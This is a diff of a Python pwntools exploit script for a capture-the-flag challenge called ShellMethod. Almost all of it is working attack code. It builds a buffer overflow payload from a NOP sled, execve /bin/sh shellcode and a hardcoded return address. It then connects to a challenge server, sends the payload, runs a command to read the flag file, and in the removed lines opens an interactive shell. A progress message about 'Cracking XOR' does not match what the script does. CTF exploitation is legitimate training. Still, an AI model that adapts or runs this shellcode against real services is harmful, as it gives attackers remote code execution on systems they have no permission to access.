@@ -1,26 +1,27 @@
 #! /usr/bin/env python3
 ##
-# Created for the Overflow challenge
+# Created for GryphonCTF 2017_ShellMethod
 # By Amos (LFlare) Ng <amosng1@gmail.com>
 ##
-import sys
+# Imports
 from pwn import *
 
-# Get buffer addresss from GDB
-elf = ELF("../service/shellmethod-server")
-buf = p32(0x804b008)
-shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+# Prepare buf address, shellcode and payload
+buf = p32(0x804b008) # Get buffer address from GDB
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
+            b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 payload = (b"\x90" * (64 - len(shellcode))) + shellcode + (b"\x41" * 4) + buf
 
-# Start binary in pipe or connect to socket
-if len(sys.argv) == 3:
-    t = remote(sys.argv[1], int(sys.argv[2]))
-else:
-    t = process("../service/shellmethod-server")
+# Logging
+with log.progress("Cracking XOR...") as p:
+    # Create tube
+    t = remote("pwn2.chal.gryphonctf.com", 17344)
 
-# Send payload and dump initial output
-t.recvuntil("Your response? ")
-t.sendline(payload)
+    # Send payload and dump initial output
+    t.recvuntil("Your response? ")
+    t.sendline(payload)
 
-# launch shell
-t.interactive()
+    # Cat flag.txt
+    t.sendline("cat flag.txt")
+    flag = t.recvline().decode()
+    p.success(flag)
